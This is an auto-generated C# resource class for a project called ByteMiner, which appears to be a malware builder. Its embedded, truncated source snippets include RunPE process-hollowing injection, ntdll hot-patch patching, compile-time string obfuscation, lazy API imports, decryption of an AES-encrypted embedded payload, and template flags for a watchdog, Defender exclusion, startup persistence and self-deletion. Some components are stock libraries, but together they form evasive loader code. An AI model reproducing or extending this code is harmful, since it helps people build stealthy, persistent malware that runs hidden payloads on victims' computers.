//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace ByteMiner.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    public class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        public static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("ByteMiner.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        public static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to /*
        ///
        ///This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
        ///Block size can be chosen in aes.h - available choices are AES128, AES192, AES256.
        ///
        ///The implementation is verified against the test vectors in:
        ///  National Institute of Standards and Technology Special Publication 800-38A 2001 ED
        ///
        ///ECB-AES128
        ///----------
        ///
        ///  plain-text:
        ///    6bc1bee22e409f96e93d7e117393172a
        ///    ae2d8a571e03ac9c9eb76fac45af8e51
        ///    30c81c46a35ce411e5fbc1191a0a52ef
        ///    f69f2445df4f9b17ad2b417be66c [rest of string was truncated]&quot;;.
        /// </summary>
        public static string aes_c {
            get {
                return ResourceManager.GetString("aes.c", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #ifndef _AES_H_
        ///#define _AES_H_
        ///
        ///#include &lt;stdint.h&gt;
        ///#include &lt;stddef.h&gt;
        ///
        ///// #define the macros below to 1/0 to enable/disable the mode of operation.
        /////
        ///// CBC enables AES encryption in CBC-mode of operation.
        ///// CTR enables encryption in counter-mode.
        ///// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.
        ///
        ///// The #ifndef-guard allows it to be configured before #include&apos;ing or at compile time.
        ///#ifndef CBC
        ///#define CBC 1
        ///#endif
        ///
        ///#ifndef ECB
        ///#define ECB 1
        ///#en [rest of string was truncated]&quot;;.
        /// </summary>
        public static string aes_h {
            get {
                return ResourceManager.GetString("aes.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #ifndef _AES_HPP_
        ///#define _AES_HPP_
        ///
        ///#ifndef __cplusplus
        ///#error Do not include the hpp header in a c project!
        ///#endif //__cplusplus
        ///
        ///extern &quot;C&quot; {
        ///#include &quot;aes.h&quot;
        ///}
        ///
        ///#endif //_AES_HPP_.
        /// </summary>
        public static string aes_hpp {
            get {
                return ResourceManager.GetString("aes.hpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
        ///&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;
        ///  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
        ///    &lt;security&gt;
        ///      &lt;requestedPrivileges&gt;
        ///        &lt;requestedExecutionLevel level=&quot;$MANIFESTLEVEL&quot; uiAccess=&quot;false&quot; /&gt;
        ///      &lt;/requestedPrivileges&gt;
        ///    &lt;/security&gt;
        ///  &lt;/trustInfo&gt;
        ///&lt;/assembly&gt;.
        /// </summary>
        public static string app_manifest {
            get {
                return ResourceManager.GetString("app.manifest", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;b64.h&quot;
        ///#include &lt;vector&gt;
        ///
        ///static const std::string base64_chars =
        ///             &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
        ///             &quot;abcdefghijklmnopqrstuvwxyz&quot;
        ///             &quot;0123456789+/&quot;;
        ///
        ///static inline bool is_base64(unsigned char c) {
        ///    return (isalnum(c) || (c == &apos;+&apos;) || (c == &apos;/&apos;));
        ///}
        ///
        ///std::string Base64::encode(const std::string&amp; data) {
        ///    std::string ret;
        ///    unsigned int val = 0;
        ///    int valb = -6;
        ///
        ///    for (unsigned char c : data) {
        ///        val = (val &lt;&lt; 8) + c;
        ///        valb += 8;
        ///        while [rest of string was truncated]&quot;;.
        /// </summary>
        public static string b64_cpp {
            get {
                return ResourceManager.GetString("b64.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #ifndef BASE64_H
        ///#define BASE64_H
        ///
        ///#include &lt;string&gt;
        ///
        ///class Base64 {
        ///public:
        ///    static std::string encode(const std::string&amp; data);
        ///    static std::string decode(const std::string&amp; encoded);
        ///};
        ///
        ///#endif // BASE64_H
        ///.
        /// </summary>
        public static string b64_h {
            get {
                return ResourceManager.GetString("b64.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;buffer_util.h&quot;
        ///#include &lt;iostream&gt;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///
        /////
        ///// validate pointer:
        /////
        ///
        ///bool validate_ptr(IN const void* buffer_bgn, IN size_t buffer_size, IN const void* field_bgn, IN size_t field_size)
        ///{
        ///    if (buffer_bgn == nullptr || field_bgn == nullptr) {
        ///        return false;
        ///    }
        ///    BYTE* _start = (BYTE*)buffer_bgn;
        ///    BYTE* _field_start = (BYTE*)field_bgn;
        ///    if (_field_start &lt; _start) {
        ///        return false;
        ///    }
        ///    size_t start_delta =  (ULONG_PTR)_fiel [rest of string was truncated]&quot;;.
        /// </summary>
        public static string buffer_util_cpp {
            get {
                return ResourceManager.GetString("buffer_util.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///
        ///#define MAX_DWORD 0xffffffff
        ///#define MAX_WORD 0xffff
        ///#define MASK_TO_DWORD(val) ((val &lt; MAX_DWORD) ? (val &amp; MAX_DWORD) : MAX_DWORD)
        ///#define MASK_TO_WORD(val) ((val &lt; MAX_WORD) ? (val &amp; MAX_WORD) : MAX_WORD)
        ///
        ///
        ///    /** 
        ///    Validates pointers, checks if the particular field is inside the given buffer. Sizes must be given in bytes.
        ///    \param buffer_bgn : the start address of the buffer
        ///    \param buffer_size : the size of the buffer
        ///    \param field_bgn : the  [rest of string was truncated]&quot;;.
        /// </summary>
        public static string buffer_util_h {
            get {
                return ResourceManager.GetString("buffer_util.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;common_util.h&quot;
        ///#include &lt;windows.h&gt;
        ///#include &lt;iostream&gt;
        ///#include &lt;string&gt;
        ///#include &lt;vector&gt;
        ///#include &lt;libloaderapi.h&gt;
        ///#include &lt;filesystem&gt;
        ///#include &lt;wchar.h&gt;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///#include &lt;tchar.h&gt;
        ///#include &lt;fstream&gt;
        ///#include &lt;vector&gt;
        ///#include &lt;iostream&gt;
        ///#include &lt;fstream&gt;
        ///#include &lt;string&gt;
        ///#include &lt;vector&gt;
        ///#include &lt;mutex&gt;
        ///#include &lt;sys/stat.h&gt; // POSIX
        ///#ifdef _WIN32
        ///    #include &lt;direct.h&gt; // Windows _mkdir
        ///    #define mkdir(path, mode) _mkdir(path)
        ///#else
        ///     [rest of string was truncated]&quot;;.
        /// </summary>
        public static string common_util_cpp {
            get {
                return ResourceManager.GetString("common_util.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///#include &lt;iostream&gt;
        ///#include &lt;filesystem&gt;
        ///#include &lt;wchar.h&gt;
        ///#include &lt;vector&gt;
        ///#include &lt;string&gt;
        ///#include &lt;winternl.h&gt;
        ///
        ///bool DisableSleep();
        ///
        ///void run_program(const char* programPath, const char* cmdLine);
        ///
        ///bool runProcess(const std::string&amp; commandLine);
        ///
        ///char manualXOR(char a, char b);
        ///
        ///void StringToWString(std::wstring &amp;ws, const std::string &amp;s);
        ///
        ///DWORD splitFirstSpace(LPCTSTR str);
        ///
        ///std::wstring ConvertToWide(LPCTSTR cmdLine);
        ///
        ///std::vector&lt;uint8_t&gt; toUTF16LE(const std: [rest of string was truncated]&quot;;.
        /// </summary>
        public static string common_util_h {
            get {
                return ResourceManager.GetString("common_util.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] embedded {
            get {
                object obj = ResourceManager.GetObject("embedded", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to 
        ///#pragma once
        ///#include &quot;lib/httplib.h&quot;
        ///#include &quot;file_util.h&quot;
        ///#include &lt;iostream&gt;
        ///#include &quot;pe_hdrs_helper.h&quot;
        ///#include &lt;vector&gt;
        ///#include &quot;lib/aes.hpp&quot;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///#include &quot;lib/obfuscate.h&quot;
        ///#include &lt;string&gt;
        ///#include &lt;regex&gt;
        ///
        ///
        ///ALIGNED_BUF load_file(IN LPCTSTR filename, OUT size_t &amp;read_size)
        ///{
        ///    HANDLE file = LI_FN(CreateFileA)(filename, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        ///    if(file == INVALID_HANDLE_VALUE) {
        ///#ifd [rest of string was truncated]&quot;;.
        /// </summary>
        public static string file_util_cpp {
            get {
                return ResourceManager.GetString("file_util.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///#include &lt;windows.h&gt;
        ///#include &quot;buffer_util.h&quot;
        ///#include &lt;iostream&gt;
        ///
        ///UNALIGNED_BUF load_file(IN LPCTSTR filename, OUT size_t &amp;r_size);
        ///
        ///BYTE* DecryptResourceBuffer(BYTE* encryptedData, size_t dataSize, const std::string&amp; key_str, const std::string&amp; iv_str, size_t&amp; outSize);
        ///
        ///BYTE* buffer_payload_resource(WORD resourceID, OUT size_t&amp; r_size, const std::string&amp; key);
        ///
        ///BYTE* load_embedded_resource(WORD lpName, OUT size_t&amp; r_size);
        ///
        ///void free_file(IN UNALIGNED_BUF buffer);
        ///
        ///BYTE* buffe [rest of string was truncated]&quot;;.
        /// </summary>
        public static string file_util_h {
            get {
                return ResourceManager.GetString("file_util.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to //
        /////  httplib.h
        /////
        /////  Copyright (c) 2025 Yuji Hirose. All rights reserved.
        /////  MIT License
        /////
        ///
        ///#ifndef CPPHTTPLIB_HTTPLIB_H
        ///#define CPPHTTPLIB_HTTPLIB_H
        ///
        ///#define CPPHTTPLIB_VERSION &quot;0.19.0&quot;
        ///
        ////*
        /// * Configuration
        /// */
        ///
        ///#ifndef CPPHTTPLIB_KEEPALIVE_TIMEOUT_SECOND
        ///#define CPPHTTPLIB_KEEPALIVE_TIMEOUT_SECOND 5
        ///#endif
        ///
        ///#ifndef CPPHTTPLIB_KEEPALIVE_TIMEOUT_CHECK_INTERVAL_USECOND
        ///#define CPPHTTPLIB_KEEPALIVE_TIMEOUT_CHECK_INTERVAL_USECOND 10000
        ///#endif
        ///
        ///#ifndef CPPHTTPLIB_KEEPALIVE_MAX_COUNT
        ///#define CPPHTTPLIB_KEEP [rest of string was truncated]&quot;;.
        /// </summary>
        public static string httplib_h {
            get {
                return ResourceManager.GetString("httplib_h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to /*
        /// * Copyright 2018-2022 Justas Masiulis
        /// *
        /// * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
        /// * you may not use this file except in compliance with the License.
        /// * You may obtain a copy of the License at
        /// *
        /// *     http://www.apache.org/licenses/LICENSE-2.0
        /// *
        /// * Unless required by applicable law or agreed to in writing, software
        /// * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
        /// * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
        /// * See the Licens [rest of string was truncated]&quot;;.
        /// </summary>
        public static string lazy_importer_hpp {
            get {
                return ResourceManager.GetString("lazy_importer.hpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;lib/httplib.h&quot;
        ///#include &lt;Windows.h&gt;
        ///#include &lt;stdio.h&gt;
        ///#include &lt;tchar.h&gt;
        ///#include &quot;run_pe.h&quot;
        ///#include &lt;iostream&gt;
        ///#include &lt;vector&gt;
        ///#include &quot;lib/obfuscate.h&quot;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///#include &lt;filesystem&gt;
        ///#include &quot;common_util.h&quot;
        ///#include &lt;stdbool.h&gt;
        ///#include &quot;lib/b64.h&quot;
        ///#include &lt;mutex&gt;
        ///
        ///$STATIC
        ///$WATCHDOG
        ///$WDEXCLUSION
        ///$NOSLEEP
        ///$ADDSTARTUP
        ///$SelfDelete
        ///
        ///LPCTSTR version = TEXT(&quot;0.2&quot;);
        ///
        ///bool g_PatchRequired = false;
        ///
        ///bool isWindows1124H2OrLater()
        ///{
        ///    NTSYSAPI NT [rest of string was truncated]&quot;;.
        /// </summary>
        public static string maincpp {
            get {
                return ResourceManager.GetString("maincpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;resource.h&quot;
        ///IDR_MANIFEST RT_MANIFEST &quot;app.manifest&quot;
        ///.
        /// </summary>
        public static string manifest_rc {
            get {
                return ResourceManager.GetString("manifest.rc", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to /* --------------------------------- ABOUT -------------------------------------
        ///
        ///Original Author: Adam Yaxley
        ///Website: https://github.com/adamyaxley
        ///License: See end of file
        ///
        ///Obfuscate
        ///Guaranteed compile-time string literal obfuscation library for C++14
        ///
        ///Usage:
        ///Pass string literals into the AY_OBFUSCATE macro to obfuscate them at compile
        ///time. AY_OBFUSCATE returns a reference to an ay::obfuscated_data object with the
        ///following traits:
        /// - Guaranteed obfuscation of string
        /// The passed string is encrypted with [rest of string was truncated]&quot;;.
        /// </summary>
        public static string obfuscate_h {
            get {
                return ResourceManager.GetString("obfuscate.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;patch_ntdll.h&quot;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///
        ///
        ///bool patch_NtManageHotPatch32(HANDLE hProcess)
        ///{
        ///    HMODULE hNtdll = LI_FN(GetModuleHandleA)(&quot;ntdll&quot;);
        ///    if (!hNtdll) return false; // should never happen
        ///
        ///    DWORD oldProtect = 0;
        ///    const SIZE_T stub_size = 0x20;
        ///
        ///    const BYTE hotpatch_patch[] = {
        ///        0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -&gt; STATUS_NOT_SUPPORTED
        ///        0xC2, 0x10, 0x00 // ret 10h
        ///    };
        ///    ULONG_PTR _NtManageHotPatch = (ULONG_PTR)LI_FN(GetProcAddress)(hNt [rest of string was truncated]&quot;;.
        /// </summary>
        public static string patch_ntdll_cpp {
            get {
                return ResourceManager.GetString("patch_ntdll.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///
        ///bool patch_NtManageHotPatch32(HANDLE hProcess);
        ///bool patch_NtManageHotPatch64(HANDLE hProcess);
        ///bool patch_ZwQueryVirtualMemory(HANDLE hProcess, LPVOID module_ptr);
        ///.
        /// </summary>
        public static string patch_ntdll_h {
            get {
                return ResourceManager.GetString("patch_ntdll.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;pe_hdrs_helper.h&quot;
        ///#include &quot;pe_helper.h&quot;
        ///#include &lt;iostream&gt;
        ///#include &lt;windows.h&gt;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///
        ///
        ///BYTE* get_nt_hdrs(IN const BYTE *pe_buffer, IN OPTIONAL size_t buffer_size)
        ///{
        ///    if (!pe_buffer) return nullptr;
        ///
        ///    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
        ///    if (buffer_size != 0) {
        ///        if (!validate_ptr((LPVOID)pe_buffer, buffer_size, (LPVOID)idh, sizeof(IMAGE_DOS_HEADER))) {
        ///            return nullptr;
        ///        }
        ///    }
        ///    else {
        ///        if  [rest of string was truncated]&quot;;.
        /// </summary>
        public static string pe_hdrs_helper_cpp {
            get {
                return ResourceManager.GetString("pe_hdrs_helper.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to /**
        ///* @file
        ///* @brief   Wrappers over various fields in the PE header. Read, write, parse PE headers.
        ///*/
        ///
        ///#pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///#include &quot;buffer_util.h&quot;
        ///
        ///#ifndef PAGE_SIZE
        ///#define PAGE_SIZE 0x1000
        ///#endif
        ///
        ///
        ///    /**
        ///    Maximal size of the PE header.
        ///    */
        ///    const ULONGLONG MAX_HEADER_SIZE = PAGE_SIZE;
        ///
        ///    template &lt;typename INT_TYPE&gt;
        ///    INT_TYPE round_up_to_unit(const INT_TYPE size, const INT_TYPE unit)
        ///    {
        ///        if (unit == 0) {
        ///            return size;
        ///         [rest of string was truncated]&quot;;.
        /// </summary>
        public static string pe_hdrs_helper_h {
            get {
                return ResourceManager.GetString("pe_hdrs_helper.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;pe_helper.h&quot;
        ///#include &quot;pe_hdrs_helper.h&quot;
        ///
        ///
        ///
        ///DWORD get_entry_point_rva(IN const BYTE *pe_buffer)
        ///{
        ///    //update image base in the written content:
        ///    BYTE* payload_nt_hdr = get_nt_hdrs(pe_buffer);
        ///    if (!payload_nt_hdr) {
        ///        return 0;
        ///    }
        ///    const bool is64b = is64bit(pe_buffer);
        ///    DWORD value = 0;
        ///    if (is64b) {
        ///        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        ///        value = payload_nt_hdr64-&gt;OptionalHeader.AddressOfEntryPoint;
        ///   [rest of string was truncated]&quot;;.
        /// </summary>
        public static string pe_helper_cpp {
            get {
                return ResourceManager.GetString("pe_helper.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///
        ///DWORD get_entry_point_rva(IN const BYTE *pe_buffer);
        ///
        ///bool is64bit(IN const BYTE *pe_buffer);.
        /// </summary>
        public static string pe_helper_h {
            get {
                return ResourceManager.GetString("pe_helper.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;pe_loader.h&quot;
        ///#include &quot;pe_hdrs_helper.h&quot;
        ///#include &quot;pe_helper.h&quot;
        ///#include &quot;relocate.h&quot;
        ///#include &quot;buffer_util.h&quot;
        ///#include &quot;pe_raw_to_virtual.h&quot;
        ///#include &quot;file_util.h&quot;
        ///
        ///BYTE* load_no_sec_pe(BYTE* dllRawData, size_t r_size, OUT size_t &amp;v_size, bool executable)
        ///{
        ///    ULONG_PTR desired_base = 0;
        ///    size_t out_size = (r_size &lt; PAGE_SIZE) ? PAGE_SIZE : r_size;
        ///    if (executable) {
        ///        desired_base = get_image_base(dllRawData);
        ///        out_size = get_image_size(dllRawData);
        ///    }
        ///     [rest of string was truncated]&quot;;.
        /// </summary>
        public static string pe_loader_cpp {
            get {
                return ResourceManager.GetString("pe_loader.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///#include &lt;windows.h&gt;
        ///#include &lt;iostream&gt;
        ///#include &lt;string&gt;
        ///#include &lt;vector&gt;
        ///#include &lt;fstream&gt;
        ///#include &lt;cstddef&gt;
        ///#include &lt;cstdint&gt;
        ///#include &lt;cstring&gt;
        ///
        ///    BYTE* load_pe_module(BYTE* payload_raw, size_t r_size, OUT size_t &amp;v_size, bool executable, bool relocate, ULONG_PTR desired_base = 0);
        ///
        ///    BYTE* load_pe_module(LPCTSTR filename, OUT size_t &amp;v_size, bool executable, bool relocate, ULONG_PTR desired_base = 0);
        ///
        ///    BYTE* load_pe_module_r(WORD resourcename, OUT size_t&amp; v_size, [rest of string was truncated]&quot;;.
        /// </summary>
        public static string pe_loader_h {
            get {
                return ResourceManager.GetString("pe_loader.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;pe_raw_to_virtual.h&quot;
        ///#include &quot;pe_hdrs_helper.h&quot;
        ///#include &quot;buffer_util.h&quot;
        ///#include &lt;iostream&gt;
        ///#include &quot;pe_helper.h&quot;
        ///
        ///// Map raw PE into virtual memory of local process:
        ///bool sections_raw_to_virtual(IN const BYTE* payload, IN SIZE_T payloadSize, OUT BYTE* destBuffer, IN SIZE_T destBufferSize)
        ///{
        ///    if (!payload || !destBuffer) return false;
        ///
        ///    BYTE* payload_nt_hdr = get_nt_hdrs(payload, payloadSize);
        ///    if (!payload_nt_hdr) {
        ///        std::cerr &lt;&lt; &quot;Invalid PE: &quot; &lt;&lt; std::hex &lt;&lt; (ULON [rest of string was truncated]&quot;;.
        /// </summary>
        public static string pe_raw_to_virtual_cpp {
            get {
                return ResourceManager.GetString("pe_raw_to_virtual.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///#include &lt;windows.h&gt;
        ///
        ///
        ///    BYTE* pe_raw_to_virtual(
        ///        IN const BYTE* rawPeBuffer,
        ///        IN size_t rawPeSize,
        ///        OUT size_t &amp;outputSize,
        ///        IN OPTIONAL bool executable = true,
        ///        IN OPTIONAL ULONG_PTR desired_base = 0
        ///    );.
        /// </summary>
        public static string pe_raw_to_virtual_h {
            get {
                return ResourceManager.GetString("pe_raw_to_virtual.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] portable_tools1 {
            get {
                object obj = ResourceManager.GetObject("portable_tools1", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] portable_tools2 {
            get {
                object obj = ResourceManager.GetObject("portable_tools2", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] portable_tools3 {
            get {
                object obj = ResourceManager.GetObject("portable_tools3", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
        ///&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;
        ///  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
        ///    &lt;security&gt;
        ///      &lt;requestedPrivileges&gt;
        ///        &lt;requestedExecutionLevel level=&quot;requireAdministrator&quot; uiAccess=&quot;$ProgramNeedsAdmin&quot; /&gt;
        ///      &lt;/requestedPrivileges&gt;
        ///    &lt;/security&gt;
        ///  &lt;/trustInfo&gt;
        ///&lt;/assembly&gt;.
        /// </summary>
        public static string programManifest {
            get {
                return ResourceManager.GetString("programManifest", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;relocate.h&quot;
        ///#include &quot;pe_helper.h&quot;
        ///#include &quot;pe_hdrs_helper.h&quot;
        ///#include &lt;iostream&gt;
        ///
        ///class ApplyRelocCallback : public RelocBlockCallback
        ///{
        ///public:
        ///    ApplyRelocCallback(bool _is64bit, ULONGLONG _oldBase, ULONGLONG _newBase)
        ///        : RelocBlockCallback(_is64bit), oldBase(_oldBase), newBase(_newBase)
        ///    {
        ///    }
        ///
        ///    virtual bool processRelocField(ULONG_PTR relocField)
        ///    {
        ///        if (is64bit) {
        ///            ULONGLONG* relocateAddr = (ULONGLONG*)((ULONG_PTR)relocField);
        ///          [rest of string was truncated]&quot;;.
        /// </summary>
        public static string relocate_cpp {
            get {
                return ResourceManager.GetString("relocate.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;    
        ///
        ///#define RELOC_32BIT_FIELD 3
        ///#define RELOC_64BIT_FIELD 0xA
        ///
        ///typedef struct _BASE_RELOCATION_ENTRY {
        ///    WORD Offset : 12;
        ///    WORD Type : 4;
        ///} BASE_RELOCATION_ENTRY;
        ///
        ///class RelocBlockCallback
        ///{
        ///public:
        ///    RelocBlockCallback(bool _is64bit)
        ///        : is64bit(_is64bit)
        ///    {
        ///    }
        ///
        ///    virtual bool processRelocField(ULONG_PTR relocField) = 0;
        ///
        ///protected:
        ///    bool is64bit;
        ///};
        ///
        ///bool process_relocation_table(IN PVOID modulePtr, IN SIZE_T moduleSize [rest of string was truncated]&quot;;.
        /// </summary>
        public static string relocate_h {
            get {
                return ResourceManager.GetString("relocate.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #define IDR_MANIFEST 1.
        /// </summary>
        public static string resource_h {
            get {
                return ResourceManager.GetString("resource.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;run_pe.h&quot;
        ///
        ///#include &lt;iostream&gt;
        ///#include &quot;patch_ntdll.h&quot;
        ///#include &quot;pe_helper.h&quot;
        ///#include &quot;relocate.h&quot;
        ///#include &quot;pe_hdrs_helper.h&quot;
        ///#include &quot;buffer_util.h&quot;
        ///#include &quot;pe_loader.h&quot;
        ///#include &quot;file_util.h&quot;
        ///#include &quot;resource.h&quot;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///#include &lt;winternl.h&gt;
        ///#include &lt;string&gt;
        ///#include &lt;tchar.h&gt;
        ///#include &quot;common_util.h&quot;
        ///
        ///
        ///extern bool g_PatchRequired;
        ///
        ///typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
        /// IN HANDLE,
        /// IN PROCESSINFOCLASS,
        /// OUT PVOID,
        /// IN U [rest of string was truncated]&quot;;.
        /// </summary>
        public static string run_pe_cpp {
            get {
                return ResourceManager.GetString("run_pe.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///
        ////**
        ///Perform the RunPE injection of the payload into the target.
        ///*/
        ///
        ///
        ///bool run_pe(IN LPCTSTR payloadPath, IN LPTSTR targetPath, IN LPCTSTR cmdLine);
        ///
        ///bool run_pe_bytes(IN BYTE* payloadData, IN size_t payloadSize, IN LPTSTR targetPath, IN LPCTSTR cmdLine, IN BOOL isEncrypted);
        ///
        ///BOOL update_remote_entry_point(PROCESS_INFORMATION&amp; pi, ULONGLONG entry_point_va, bool is32bit);
        ///.
        /// </summary>
        public static string run_pe_h {
            get {
                return ResourceManager.GetString("run_pe.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to /***
        ///*tchar.h - definitions for generic international text functions
        ///*
        ///*       Copyright (c) Microsoft Corporation. All rights reserved.
        ///*
        ///*Purpose:
        ///*       Definitions for generic international functions, mostly defines
        ///*       which map string/formatted-io/ctype functions to char, wchar_t, or
        ///*       MBCS versions.  To be used for compatibility between single-byte,
        ///*       multi-byte and Unicode text models.
        ///*
        ///*       [Public]
        ///*
        ///****/
        ///
        ///#pragma once
        ///#ifndef _INC_TCHAR // include guard for 3 [rest of string was truncated]&quot;;.
        /// </summary>
        public static string tchar_h {
            get {
                return ResourceManager.GetString("tchar.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#ifdef UNICODE
        ///#define tcout wcout
        ///#define tcerr wcerr
        ///#define tstring wstring
        ///#else
        ///#define tcout cout
        ///#define tcerr cerr
        ///#define tstring string
        ///#endif // UNICODE
        ///.
        /// </summary>
        public static string unicode_h {
            get {
                return ResourceManager.GetString("unicode.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &lt;windows.h&gt;
        ///#include &lt;stdio.h&gt;
        ///#include &lt;mutex&gt; 
        ///#include &lt;string&gt;
        ///#include &lt;filesystem&gt;
        ///#include &quot;common_util.h&quot;
        ///#include &lt;shlobj.h&gt;
        ///#include &lt;iostream&gt;
        ///#include &lt;vector&gt;
        ///#include &quot;lib/lazy_importer.hpp&quot;
        ///
